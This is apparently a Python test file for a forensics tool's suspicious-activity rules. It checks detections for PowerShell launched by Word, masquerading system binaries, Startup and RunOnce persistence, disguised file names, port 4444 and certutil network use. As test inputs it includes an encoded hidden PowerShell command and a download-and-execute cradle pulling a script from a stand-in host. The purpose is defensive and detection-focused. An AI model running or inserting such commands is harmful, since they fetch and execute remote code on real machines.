import os
import tempfile
from datetime import datetime, timedelta

os.environ.setdefault("FORENSICS_DATA_DIR", tempfile.mkdtemp(prefix="forensics_rules_"))

from core.database.models import ForensicEvent
from core.services.correlation import correlate_events, CorrelationWorker, MAX_EVENT_FINDINGS
from core.services.graph import EvidenceGraph
from core.services.suspicious import detect_suspicious_activity, detect_event_findings

BASE = datetime(2026, 1, 1, 12, 0, 0)
_counter = [0]


def ev(event_type, seconds=0, **fields):
    _counter[0] += 1
    fields.setdefault("host", "PC-01")
    return ForensicEvent(
        case_id="c", evidence_id=f"ev{_counter[0]}", source_type="test",
        event_type=event_type, timestamp=BASE + timedelta(seconds=seconds), **fields,
    )


def rules_for(events, graph_events=None):
    graph = EvidenceGraph(f"case_{_counter[0]}", storage_dir=tempfile.mkdtemp())
    graph.populate_from_correlations(correlate_events(list(graph_events or events), max_window_seconds=86400))
    return detect_suspicious_activity(graph.snapshot(), events)


def names(findings):
    return [f["rule_name"] for f in findings]


def check(label, condition):
    assert condition, label
    print(f"PASS  {label}")


def test_existing_rules_fixed():
    # Live file events are lower-cased, process paths are not: must still correlate.
    f = rules_for([
        ev("file_created", 0, file="evil.exe", path="c:\\users\\bob\\appdata\\local\\temp\\evil.exe"),
        ev("process_started", 5, pid=10, process="Evil.exe", path="C:\\Users\\Bob\\AppData\\Local\\Temp\\Evil.exe"),
    ])
    check("case-insensitive file->process match gives Unusual Directory Execution",
          "Unusual Directory Execution" in names(f))

    # "template" / "attempt" in a folder name must not count as a temp directory.
    f = rules_for([
        ev("file_created", 0, file="tool.exe", path="D:\\Templates\\attempt\\tool.exe"),
        ev("process_started", 5, pid=11, process="tool.exe", path="D:\\Templates\\attempt\\tool.exe"),
    ])
    check("no false Unusual Directory match on 'Templates'/'attempt'",
          "Unusual Directory Execution" not in names(f) and "Rapid Execution" in names(f))

    # Offline correlation window is 24h; only <= 5 minutes is "rapid".
    f = rules_for([
        ev("file_created", 0, file="late.exe", path="D:\\Tools\\late.exe"),
        ev("process_started", 3600, pid=12, process="late.exe", path="D:\\Tools\\late.exe"),
    ])
    check("execution one hour after creation is not Rapid Execution", "Rapid Execution" not in names(f))


def test_parent_child():
    f = detect_event_findings([ev("process_started", pid=20, process="powershell.exe", parent_process="WINWORD.EXE")])
    check("Word starting PowerShell -> Suspicious Program Launch",
          names(f) == ["Suspicious Program Launch"] and f[0]["score"] == 0.85)
    f = detect_event_findings([ev("process_started", pid=21, process="cmd.exe", parent_process="explorer.exe")])
    check("Explorer starting cmd is not flagged", f == [])


def test_masquerade():
    f = detect_event_findings([ev("process_started", pid=30, process="svchost.exe",
                                  path="C:\\Users\\Bob\\AppData\\Roaming\\svchost.exe")])
    check("svchost.exe outside Windows folder -> Disguised System Program", names(f) == ["Disguised System Program"])
    for path in ("C:\\Windows\\System32\\svchost.exe", "\\??\\C:\\WINDOWS\\system32\\conhost.exe",
                 "%SystemRoot%\\system32\\csrss.exe", "svchost.exe"):
        f = detect_event_findings([ev("process_started", pid=31, process=path.split("\\")[-1], path=path)])
        check(f"genuine/unknown location not flagged: {path}", f == [])


def test_powershell():
    enc = "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
    f = detect_event_findings([ev("process_started", pid=40, process="powershell.exe", metadata_json={"cmdline": enc.split()})])
    check("encoded + hidden PowerShell -> 0.90", names(f) == ["Obfuscated PowerShell"] and f[0]["score"] == 0.9)

    cradle = "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\""
    f = detect_event_findings([ev("process_started", pid=41, process="powershell.exe", metadata_json={"command_line": cradle})])
    check("download cradle -> Obfuscated PowerShell", names(f) == ["Obfuscated PowerShell"])

    benign = "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1"
    f = detect_event_findings([ev("process_started", pid=42, process="powershell.exe", metadata_json={"command_line": benign})])
    check("policy bypass alone (common in admin scripts) is not flagged", f == [])

    f = detect_event_findings([ev("process_started", pid=43, process="powershell.exe",
                                  metadata_json={"command_line": "powershell -ep bypass -w hidden -File x.ps1"})])
    check("hidden window + bypass together -> 0.65", names(f) == ["Obfuscated PowerShell"] and f[0]["score"] == 0.65)


def test_persistence():
    f = detect_event_findings([ev("file_created", file="upd.lnk",
                                  path="C:\\Users\\Bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\upd.lnk")])
    check("file in Startup folder -> Startup Persistence", names(f) == ["Startup Persistence"])
    f = detect_event_findings([ev("file_created", file="desktop.ini",
                                  path="C:\\Users\\Bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini")])
    check("desktop.ini in Startup folder is ignored", f == [])
    f = detect_event_findings([ev("registry_modified",
                                  path="HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\updater")])
    check("RunOnce registry value -> Autorun Registry Change", names(f) == ["Autorun Registry Change"])
    f = detect_event_findings([ev("registry_modified", path="HKLM\\Software\\Vendor\\Settings\\Theme")])
    check("ordinary registry change is not flagged", f == [])


def test_disguised_files():
    f = detect_event_findings([ev("file_created", file="invoice.pdf.exe", path="C:\\Users\\Bob\\Downloads\\invoice.pdf.exe")])
    check("invoice.pdf.exe -> Disguised Executable", names(f) == ["Disguised Executable"])
    f = detect_event_findings([ev("file_created", file="photo\u202egpj.exe", path="C:\\Users\\Bob\\photo\u202egpj.exe")])
    check("right-to-left override name -> Disguised Executable", names(f) == ["Disguised Executable"])
    f = detect_event_findings([ev("file_created", file="readme.js", path="C:\\Users\\Bob\\Downloads\\readme.js")])
    check(".js in Downloads -> Risky Script File", names(f) == ["Risky Script File"])
    f = detect_event_findings([ev("file_created", file="app.js", path="D:\\Projects\\site\\app.js")])
    check(".js in a project folder is not flagged", f == [])
    f = detect_event_findings([ev("file_created", file="report.final.pdf", path="C:\\Users\\Bob\\Downloads\\report.final.pdf")])
    check("normal multi-dot document is not flagged", f == [])


def test_ports_and_lolbins():
    f = detect_event_findings([ev("connection", pid=50, process="x.exe", ip="203.0.113.9", port=4444)])
    check("port 4444 -> Suspicious Network Port", names(f) == ["Suspicious Network Port"])
    f = detect_event_findings([ev("connection", pid=51, process="x.exe", ip="127.0.0.1", port=4444)])
    check("loopback port 4444 is ignored", f == [])
    f = detect_event_findings([ev("connection", pid=52, process="chrome.exe", ip="203.0.113.9", port=443)])
    check("normal HTTPS port is not flagged", f == [])

    # 203.0.113.x is a documentation range that ipaddress treats as private; use a real public IP.
    f = rules_for([ev("connection", pid=53, process="certutil.exe", ip="93.184.216.34", port=80)])
    check("certutil contacting public IP -> Built-in Tool Contacting Internet",
          "Built-in Tool Contacting Internet" in names(f))
    f = rules_for([ev("connection", pid=54, process="certutil.exe", ip="192.168.1.5", port=80)])
    check("certutil on the local network is not flagged", "Built-in Tool Contacting Internet" not in names(f))


def test_worker_keeps_bounded_findings():
    worker = CorrelationWorker("c", graph_db=None)
    check("new event finding reported",
          worker._collect_event_findings([ev("connection", pid=60, process="x.exe", ip="203.0.113.9", port=4444)]))
    check("repeated identical finding is not new",
          not worker._collect_event_findings([ev("connection", pid=60, process="x.exe", ip="203.0.113.9", port=4444)]))
    burst = [ev("connection", pid=1000 + i, process="x.exe", ip="203.0.113.9", port=4444)
             for i in range(MAX_EVENT_FINDINGS + 50)]
    worker._collect_event_findings(burst)
    check("event findings are capped", len(worker._event_findings) == MAX_EVENT_FINDINGS)


if __name__ == "__main__":
    test_existing_rules_fixed()
    test_parent_child()
    test_masquerade()
    test_powershell()
    test_persistence()
    test_disguised_files()
    test_ports_and_lolbins()
    test_worker_keeps_bounded_findings()
    print("All suspicious-rule tests passed.")
